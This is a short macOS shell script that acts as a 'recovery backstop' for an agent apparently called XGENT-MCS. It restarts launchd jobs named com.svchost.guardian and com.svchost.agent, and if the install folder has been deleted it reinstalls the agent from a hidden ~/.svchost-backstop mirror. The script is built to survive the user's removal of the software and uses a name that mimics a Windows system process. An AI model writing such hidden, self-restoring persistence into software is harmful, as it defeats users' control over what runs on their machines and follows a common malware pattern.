#!/usr/bin/env bash
# SvcHost recovery backstop for macOS.
#
# Runs from a hidden mirror outside the install root, so it survives deletion of
# the whole checkout. If the agent tree is present it keeps the launchd jobs
# alive; if it is gone it re-bootstraps from the mirror. Best effort only.
set -u

INSTALL_ROOT="${XIDER_INSTALL_ROOT:-$HOME/Library/Application Support/SvcHost}"
MIRROR="${XIDER_BACKSTOP_ROOT:-$HOME/.svchost-backstop}"
agent="$INSTALL_ROOT/git-ver/XGENT-MCS"

present() { [ -e "$agent/xgent_mcs.py" ] || [ -d "$agent/XIDER.app" ] || [ -e "$agent/start_agent.sh" ]; }

reload() {
  local label="$1" plist="$HOME/Library/LaunchAgents/$1.plist"
  if launchctl print "gui/$(id -u)/$label" >/dev/null 2>&1; then
    launchctl kickstart -k "gui/$(id -u)/$label" >/dev/null 2>&1 || true
  elif [ -f "$plist" ]; then
    launchctl bootstrap "gui/$(id -u)" "$plist" >/dev/null 2>&1 || true
  fi
}

if present; then
  reload com.svchost.guardian
  reload com.svchost.agent
  exit 0
fi

boot="$MIRROR/bootstrap.sh"
[ -f "$boot" ] || exit 0
XIDER_ENV_ROOT="$MIRROR" XIDER_BACKSTOP_ROOT="$MIRROR" /bin/bash "$boot"
exit $?
